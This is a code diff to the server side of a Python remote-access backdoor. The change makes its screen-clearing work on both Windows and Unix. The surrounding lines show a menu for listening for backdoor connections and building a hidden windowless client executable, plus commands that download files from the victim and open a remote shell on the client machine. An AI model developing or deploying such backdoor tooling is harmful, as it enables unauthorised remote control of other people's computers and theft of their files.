@@ -5,7 +5,6 @@ import socket
 import os
 import struct
 import shutil
-import re
 
 
 
@@ -46,7 +45,7 @@ class Server(): #class Server: define the server properties
 
 def main_menu(): #define the main menu
     while True:
-        os.system('cls')
+        os.system(clear)
         print("""
         1. Configure the client file
         2. Listen to a port and remote a backdoor
@@ -62,7 +61,7 @@ def main_menu(): #define the main menu
 
 
 def configure(): #configure the client with ip and port
-    os.system('cls')
+    os.system(clear)
     HOST = input("Enter the host/ip of the client: ")
     PORT = input("Enter the port of the client: ")
     exe = input("Do you want to create an executable (y/n): ")
@@ -73,7 +72,7 @@ def configure(): #configure the client with ip and port
     with open('client.py', 'w') as file:
         file.write(''.join(content))
     if exe == 'y':
-        os.system('cls')
+        os.system(clear)
         print('Creating the executable... This may take a while.')
         os.system("pyinstaller --clean -w -F --distpath exe --log-level WARN client.py")
         os.remove('client.spec')
@@ -104,7 +103,7 @@ def listener(): #define the socket and listen for connections
 
 def interpreter(sock, client): #wait for commands and interpret them
     print("Enter a command or 'help', for a list of the availables commands")
-    os.system('cls')
+    os.system(clear)
     while True:
         command = input('>>> ')
         try:
@@ -161,7 +160,7 @@ def download(): #download command: download a file from the client
 
 
 def cmd(): #cmd command: open a shell on the client machine
-    os.system('cls')
+    os.system(clear)
     server.send('cmd'.encode())
     while True: 
         dir = server.recv().decode().strip()
@@ -175,5 +174,10 @@ def cmd(): #cmd command: open a shell on the client machine
             break
 
 
+if os.name == 'nt':
+    clear = 'cls'
+else :
+    clear = 'clear'
 main_menu()
+
     
